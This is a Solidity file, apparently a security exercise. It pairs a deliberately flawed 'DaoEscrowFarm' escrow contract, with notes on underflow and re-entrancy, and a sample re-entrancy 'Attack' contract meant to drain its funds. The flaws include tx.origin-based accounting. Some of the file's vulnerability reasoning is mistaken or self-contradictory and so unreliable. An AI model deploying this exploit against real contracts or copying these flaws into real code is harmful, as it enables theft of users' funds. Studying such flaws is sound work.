//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.2;


/*
 *
 *   DaoEscrowFarm contract provided. 
 *   This is a simple system that allows users to deposit 1 eth per block, and withdraw their deposits in a future date. 
 *   The implementation contains many flaws, including lack of optimisations and bugs that can be exploited to steal funds.
 *
 *   Scenarios:
 *
 *   -  How someone could deposit more than 1 eth per block ?

        Unsafe Subtraction Underflow:
        Say, a user sends 0.1 ETH in first transaction;
        The next time he sends 1 ETH; the maxAllowed will be 0.9 ETH,
        but the previous balance (0.1), will be subtracted by 0.9, which would cause underflow.
        Leading to an overall value greater than 1 ETH.
        Safe Math can prevent this issue.


 *   - Re-entrancy vulnerabilities. Sample exploit contract.
        Checked for re-entrancy. 
        Since tx.origin is used as mapping key (without ownership modifier), it does not affect in calling another contract to recursively drain funds.
        Using msg.sender can lead to re-entrancy, but in this case the state is modified before the transaction is made.
        So, during re-entrancy, there are no funds that can be drained.
        Contrary, it might be good to offer a refund here in the case of withdrawl failure.


 *   - Optimisation the `receive` function to have cheaper gas.
 
 */



contract DaoEscrowFarm {
    uint256 immutable DEPOSIT_LIMIT_PER_BLOCK = 1 ether;

    struct UserDeposit {
        uint256 balance;
        uint256 blockDeposited;
    }
    mapping(address => UserDeposit) public deposits;

    constructor() public {}

    receive() external payable {
        require(msg.value <= DEPOSIT_LIMIT_PER_BLOCK, "TOO_MUCH_ETH");

        UserDeposit storage prev = deposits[tx.origin];

        //Optimization 1
        //UserDeposit memory prev = deposits[tx.origin];


        uint256 maxDeposit = prev.blockDeposited == block.number
            ? DEPOSIT_LIMIT_PER_BLOCK - prev.balance
            : DEPOSIT_LIMIT_PER_BLOCK;

        if(msg.value > maxDeposit) {
            // refund user if they are above the max deposit allowed
            uint256 refundValue = maxDeposit - msg.value;

            //Optimization 2
            //prev.balance -= maxDeposit - msg.value;
            
            (bool success,) = msg.sender.call{value: refundValue}("");
            require(success, "ETH_TRANSFER_FAIL");
            
            prev.balance -= refundValue;
        }

        prev.balance += msg.value;
        prev.blockDeposited = block.number;

        //Optimization 3
        //deposits[tx.origin] = prev;
    }

    function withdraw(uint256 amount) external {
        UserDeposit storage prev = deposits[tx.origin];

        // Preventing Phishing Attack
        // UserDeposit storage prev = deposits[msg.sender];

        require(prev.balance >= amount, "NOT_ENOUGH_ETH");

        prev.balance -= amount;
        
        (bool success,) = msg.sender.call{value: amount}("");
        require(success, "ETH_TRANSFER_FAIL");
    }
}


// Sample Re-Entrancy Attack to drain funds
contract Attack {
    DaoEscrowFarm public daoEscrowFarm;

    constructor(address payable _daoEscrowFarmAddress) {
        daoEscrowFarm = DaoEscrowFarm(_daoEscrowFarmAddress);
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(daoEscrowFarm).balance >= 1 ether) {
            daoEscrowFarm.withdraw(1 ether);
        }
    }

    function attack(address payable _daoEscrowFarmAddress) external payable {
        require(msg.value >= 1 ether);
        //daoEscrowFarm.receive{value: 1 ether}();
        _daoEscrowFarmAddress.call{value: 1 ether}("");
        daoEscrowFarm.withdraw(1 ether);
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}